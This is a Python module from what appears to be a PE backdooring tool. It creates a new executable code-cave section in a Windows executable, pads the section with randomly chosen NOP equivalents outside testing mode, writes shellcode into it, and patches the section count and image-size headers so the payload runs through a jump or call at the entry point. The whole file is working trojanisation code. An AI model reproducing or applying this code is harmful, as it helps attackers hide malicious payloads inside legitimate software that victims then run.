import os
import logging
from core import enum
import io
import struct
from random import choice
from pe.core import intelCore
logger = logging.getLogger(__name__)


class add_section:

    def __init__(self, BDF=None):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = """add_section"""
        self.description = """Add section to the end of a PE file that will store payload"""
        self.requirements = {
                            }
        self.supported_methods = ['jmp_at_entrypoint', 'call_at_entrypoint']

        self.BDF = BDF

    def invoke_mode(self):

        return self.create_code_cave()

    def create_code_cave(self):
        """
        This function creates a code cave for shellcode to hide,
        takes in the dict from gather_file_info_win function and
        writes to the file and returns flItms
        """
        logger.info("[*] Creating Code Cave as a PE Section")
        self.BDF.pe_object['NewSectionSize'] = len(self.BDF.pe_object['shellcode']) + 250  # bytes
        if 'NSECTION' in self.BDF.options.keys():

            self.BDF.pe_object['SectionName'] = self.BDF.options['NSECTION']  # less than 7 chars
        else:
            self.BDF.pe_object['SectionName'] = b'sdata'

        if 'newSectionPointerToRawData_iat' in self.BDF.patch_instr:
            # IDT (IAT) was added as a new section
            logger.debug('[*] Using filesize + IDT section as new file size')
            self.BDF.pe_object['filesize'] = struct.unpack("<I", self.BDF.patch_instr['newSectionPointerToRawData_iat'])[0] + \
                                             struct.unpack("<I", self.BDF.patch_instr["SizeOfRawData_iat"])[0]
        else:
            self.BDF.pe_object['filesize'] = self.BDF.pe_object['filename'].getbuffer().nbytes
        self.BDF.pe_object['newSectionPointerToRawData'] = self.BDF.pe_object['filesize']
        self.BDF.pe_object['VirtualSize'] = int(str(self.BDF.pe_object['NewSectionSize']), 16)
        self.BDF.pe_object['SizeOfRawData'] = self.BDF.pe_object['VirtualSize']
        self.BDF.pe_object['NewSectionName'] = b"." + self.BDF.pe_object['SectionName']
        self.BDF.pe_object['newSectionFlags'] = int('e00000e0', 16)
        self.BDF.pe_object['CodeCaveVirtualAddress'] = (self.BDF.pe_object['SizeOfImage'] +
                                                 self.BDF.pe_object['ImageBase'])
        self.BDF.pe_object['buffer'] = int('200', 16)  # bytes
        self.BDF.pe_object['JMPtoCodeAddress'] = (self.BDF.pe_object['CodeCaveVirtualAddress'] -
                                           self.BDF.pe_object['PatchLocation'] -
                                           self.BDF.pe_object['ImageBase'] - 5 +
                                           self.BDF.pe_object['buffer'])

        self.BDF.pe_object['NewCodeCave'] = True

        return True

    def get_patch_instr(self):

        self.BDF.patch_instr[self.BDF.pe_object['pe_header_location'] + 6] = struct.pack('<H', self.BDF.pe_object['NumberOfSections'] + 1)

        self.BDF.pe_object['NewSizeOfImage'] = (self.BDF.pe_object['VirtualSize'] +
                                                self.BDF.pe_object['SizeOfImage'])

        self.BDF.patch_instr[self.BDF.pe_object['SizeOfImageLoc']] = struct.pack('<I', self.BDF.pe_object['NewSizeOfImage'])

        if self.BDF.pe_object['BoundImportLOCinCode'] != 0:
            self.BDF.patch_instr[self.BDF.pe_object['BoundImportLocation']] = struct.pack('<I', self.BDF.pe_object['BoundImportLOCinCode'] + 40)

        self.BDF.patch_instr[self.BDF.pe_object['BeginSections'] + 40 * self.BDF.pe_object['NumberOfSections']] = self.BDF.pe_object['NewSectionName'] + b"\x00" * (8 - len(self.BDF.pe_object['NewSectionName']))

        self.BDF.patch_instr['VirtualSize'] = struct.pack('<I', self.BDF.pe_object['VirtualSize'])

        self.BDF.patch_instr['SizeOfImage'] = struct.pack('<I', self.BDF.pe_object['SizeOfImage'])

        self.BDF.patch_instr['SizeOfRawData'] = struct.pack('<I', self.BDF.pe_object['SizeOfRawData'])

        self.BDF.patch_instr['newSectionPointerToRawData'] = struct.pack('<I', self.BDF.pe_object['newSectionPointerToRawData'])

        logger.debug(f"New Section PointerToRawData,: {self.BDF.pe_object['newSectionPointerToRawData']}")

        self.BDF.patch_instr['CONT1'] = struct.pack('<I', 0)

        self.BDF.patch_instr['CONT2'] = struct.pack('<I', 0)

        self.BDF.patch_instr['CONT3'] = struct.pack('<I', 0)

        self.BDF.patch_instr['newSectionFlags'] = struct.pack('<I', self.BDF.pe_object['newSectionFlags'])

        self.BDF.patch_instr['ImportTableALL'] = self.BDF.pe_object['ImportTableALL']

        if self.BDF.TESTING:
            nop = 0x90
        else:
            nop = choice(intelCore.intelCore.nops)

        if nop > 144:
            self.BDF.patch_instr[self.BDF.pe_object['filesize'] + 1] = struct.pack('!H', nop) * int((self.BDF.pe_object['VirtualSize'] / 2))
        else:
            self.BDF.patch_instr[self.BDF.pe_object['filesize'] + 1] = struct.pack('!B', nop) * (self.BDF.pe_object['VirtualSize'])

        logger.debug(hex(self.BDF.pe_object['newSectionPointerToRawData'] + self.BDF.pe_object['buffer']))
        self.BDF.patch_instr[self.BDF.pe_object['newSectionPointerToRawData'] + self.BDF.pe_object['buffer']] = self.BDF.pe_object['completeShellcode']

        return True
